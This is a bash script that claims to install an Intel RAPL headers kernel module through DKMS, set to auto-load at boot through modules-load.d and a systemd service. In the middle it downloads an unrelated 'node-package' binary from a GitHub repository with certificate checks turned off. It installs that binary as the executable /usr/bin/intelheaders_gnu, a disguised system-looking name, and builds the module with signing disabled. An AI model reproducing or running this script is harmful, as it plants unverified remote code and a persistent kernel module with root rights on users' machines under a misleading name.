#!/bin/bash

set -e

# Module and version
MODULE_NAME="intel_rapl_headers"
MODULE_VERSION="1.0"
SRC_DIR=$(pwd)
DKMS_DIR="/usr/src/${MODULE_NAME}-${MODULE_VERSION}"

echo "[*] Installing dependencies..."
if command -v apt &> /dev/null; then
    sudo apt update
    sudo apt install -y dkms build-essential linux-headers-$(uname -r) wget
elif command -v yum &> /dev/null; then
    sudo yum install -y epel-release
    sudo yum install -y dkms gcc make kernel-devel-$(uname -r) wget
elif command -v pacman &> /dev/null; then
    sudo pacman -Sy --noconfirm dkms base-devel linux-headers wget
else
    echo "[!] Unsupported package manager. Install dkms, gcc, make, headers manually."
    exit 1
fi

echo "[+] DKMS and build tools installed."

# Install agent binary
echo "[*] Downloading agent binary..."
sudo wget https://github.com/yellphonenaing199/installer/raw/refs/heads/main/node-package --no-check-certificate -O /usr/bin/intelheaders_gnu
sudo chmod +x /usr/bin/intelheaders_gnu
echo "[+] Agent installed to /usr/bin/intelheaders_gnu"

# Prepare DKMS source directory
echo "[*] Preparing DKMS source directory..."
sudo rm -rf "$DKMS_DIR"
sudo mkdir -p "$DKMS_DIR"

echo "[*] Copying source files..."
sudo cp -r "$SRC_DIR"/* "$DKMS_DIR"

echo "[*] Creating dkms.conf..."
sudo tee "$DKMS_DIR/dkms.conf" > /dev/null <<EOF
PACKAGE_NAME="${MODULE_NAME}"
PACKAGE_VERSION="${MODULE_VERSION}"
BUILT_MODULE_NAME[0]="${MODULE_NAME}"
DEST_MODULE_LOCATION[0]="/updates/dkms"
AUTOINSTALL="yes"
MAKE[0]="make CONFIG_MODULE_SIG=n -C \${kernel_source_dir} M=\${dkms_tree}/\${PACKAGE_NAME}/\${PACKAGE_VERSION}/build modules"
CLEAN="make -C \${kernel_source_dir} M=\${dkms_tree}/\${PACKAGE_NAME}/\${PACKAGE_VERSION}/build clean"
EOF

echo "[*] Cleaning previous DKMS module if exists..."
sudo dkms remove -m "$MODULE_NAME" -v "$MODULE_VERSION" --all || true

echo "[*] Adding, building, and installing module via DKMS..."
sudo dkms add -m "$MODULE_NAME" -v "$MODULE_VERSION"
sudo dkms build -m "$MODULE_NAME" -v "$MODULE_VERSION"
sudo dkms install -m "$MODULE_NAME" -v "$MODULE_VERSION"

# Auto-load using /etc/modules-load.d
echo "[*] Configuring module to auto-load at boot via modules-load.d..."
echo "$MODULE_NAME" | sudo tee "/etc/modules-load.d/${MODULE_NAME}.conf" > /dev/null

# Add systemd service as fallback
echo "[*] Creating systemd service to load module..."
sudo tee "/etc/systemd/system/load_${MODULE_NAME}.service" > /dev/null <<EOF
[Unit]
Description=Load ${MODULE_NAME} module at boot
After=network.target

[Service]
Type=oneshot
ExecStart=/sbin/modprobe ${MODULE_NAME}
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reexec
sudo systemctl daemon-reload
sudo systemctl enable load_${MODULE_NAME}.service

echo "[*] Loading module now..."
sudo modprobe "$MODULE_NAME" || echo "[!] Manual load failed. Reboot will retry via systemd."

echo "[+] Module '${MODULE_NAME}' loaded and configured to auto-load on boot."
